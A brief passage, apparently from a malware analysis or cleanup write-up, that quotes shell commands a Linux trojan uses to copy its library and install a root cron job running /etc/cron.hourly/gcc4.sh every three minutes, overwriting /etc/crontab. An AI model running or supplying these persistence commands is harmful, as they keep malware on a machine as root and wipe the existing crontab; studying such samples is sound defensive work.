...
cp /lib/libudev4.so /lib/libudev4.so.6<br>
/lib/libudev4.so.6<br>
```

```
sed -i \'/\\/etc\\/cron.hourly\\/gcc4.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc4.sh\' > /etc/crontab<br>
```
